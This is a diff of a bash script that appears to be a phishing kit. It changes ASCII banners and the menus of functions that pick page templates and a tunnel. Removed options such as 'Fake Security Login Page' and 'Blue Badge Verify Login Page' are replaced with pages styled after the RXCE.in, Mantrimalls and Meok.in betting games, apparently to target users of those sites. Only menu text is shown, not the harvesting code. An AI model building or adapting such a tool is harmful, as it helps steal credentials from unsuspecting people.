@@ -152,13 +152,12 @@ kill_pid() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE}
-		${ORANGE} ____  __  ______ _____   _____             
-		${ORANGE}|  _ \ \ \/ / ___| ____| |___  |___              
-		${ORANGE}| |_) | \  / |   |  _|      / // _ \
-		${ORANGE}|  _ <  /  \ |___| |___    / /| (_) |
-		${ORANGE}|_| \_\/_/\_\____|_____|  /_/(_)___/                                 
-		${ORANGE}                       ${RED}Version : 7.0
+		${GREEN} ____  ____  ___ __  __ _____           
+		${GREEN}|  _ \|  _ \|_ _|  \/  | ____|              
+		${GREEN}| |_) | |_) || || |\/| |  _|
+		${GREEN}|  __/|  _ < | || |  | | |___
+		${GREEN}|_|   |_| \_\___|_|  |_|_____|                                 
+		${ORANGE}                                    ${RED}Version :: 7.0
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by IDFC (MITHUN)${WHITE}
 	EOF
@@ -171,12 +170,13 @@ banner_small() {
 		${BLUE}     /\  \         /\  \  
 		${BLUE}    _\:\  \       /::\  \       ___           ___  
 		${BLUE}   /\ \:\  \     /:/\:\  \     /\__\         /\__\  
-    ${BLUE}  _\:\ \:\  \   /:/ /::\  \   /:/__/        /:/  /
-    ${BLUE} /\ \:\ \:\__\ /:/_/:/\:\__\ /::\  \       /:/__/
-    ${BLUE} \:\ \:\/:/  / \:\/:/  \/__/ \/\:\  \__   /::\  \
-    ${BLUE}   \:\/:/  /     \:\  \          \::/  / \/__\:\  \
-    ${BLUE}    \::/  /       \:\__\         /:/  /       \:\__\
-    ${BLUE}     \/__/         \/__/         \/__/         \/__/ {RED}Version 2.7
+                ${BLUE}  _\:\ \:\  \   /:/ /::\  \   /:/__/        /:/  /
+                ${BLUE} /\ \:\ \:\__\ /:/_/:/\:\__\ /::\  \       /:/__/
+                ${BLUE} \:\ \:\/:/  / \:\/:/  \/__/ \/\:\  \__   /::\  \
+                ${BLUE}   \:\/:/  /     \:\  \          \::/  / \/__\:\  \
+                ${BLUE}    \::/  /       \:\__\         /:/  /       \:\__\
+                ${BLUE}     \/__/         \/__/         \/__/         \/__/ 
+		${RED}                                                  Version :: 7.0
 	EOF
 }
 
@@ -471,10 +471,10 @@ tunnel_menu() {
 site_Parity() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Hacker Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Amusebox Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Advanced AmuseBox Page
+		${RED}[${WHITE}03${RED}]${ORANGE} Black BackGround Page
+		${RED}[${WHITE}04${RED}]${ORANGE} RXCE.IN Page
 
 	EOF
 
@@ -499,7 +499,7 @@ site_Parity() {
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; clear; banner_small; site_facebook; };;
+			{ sleep 1; clear; banner_small; site_Parity; };;
 	esac
 }
 
@@ -507,10 +507,10 @@ site_Parity() {
 site_Bcone() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Amusebox Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Advanced AmuseBox Page
+		${RED}[${WHITE}03${RED}]${ORANGE} Black BackGround Page
+		${RED}[${WHITE}04${RED}]${ORANGE} RXCE.IN Page
 
 	EOF
 
@@ -543,9 +543,9 @@ site_Bcone() {
 site_Emerd() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE}  Old Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE}  New Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
+		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Amusebox Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Black BackGround Page
+		${RED}[${WHITE}03${RED}]${ORANGE} RXCE.IN Page
 
 	EOF
 
@@ -573,9 +573,9 @@ site_Emerd() {
 ## Sapre
 site_Sapre() {
 	cat <<- EOF
-
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
+	
+		${RED}[${WHITE}01${RED}]${ORANGE} Black BackGround Page
+		${RED}[${WHITE}02${RED}]${ORANGE} RXCE.IN Page
 
 	EOF
 
@@ -602,7 +602,7 @@ main_menu() {
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Choice To Play ${RED}[${WHITE}::${RED}]${ORANGE}
     
-    ${RED}[${WHITE}Server${RED}]${ORANGE}RXCE.in    ${RED}[${WHITE}Server${RED}]${ORANGE}Mantri    ${RED}[${WHITE}Server${RED}]${ORANGE}Meok.in
+                ${RED}[${WHITE}::${RED}]${ORANGE}RXCE.in        ${RED}[${WHITE}::${RED}]${ORANGE}Mantrimalls   ${RED}[${WHITE}Server${RED}]${ORANGE}Meok.in
 		${RED}[${WHITE}01${RED}]${ORANGE} Parity        ${RED}[${WHITE}11${RED}]${ORANGE} Parity       ${RED}[${WHITE}21${RED}]${ORANGE} Parity
 		${RED}[${WHITE}02${RED}]${ORANGE} Bcone         ${RED}[${WHITE}12${RED}]${ORANGE} Bcone        ${RED}[${WHITE}22${RED}]${ORANGE} Bcone
 		${RED}[${WHITE}03${RED}]${ORANGE} Emerd         ${RED}[${WHITE}13${RED}]${ORANGE} Emerd        ${RED}[${WHITE}23${RED}]${ORANGE} Emerd
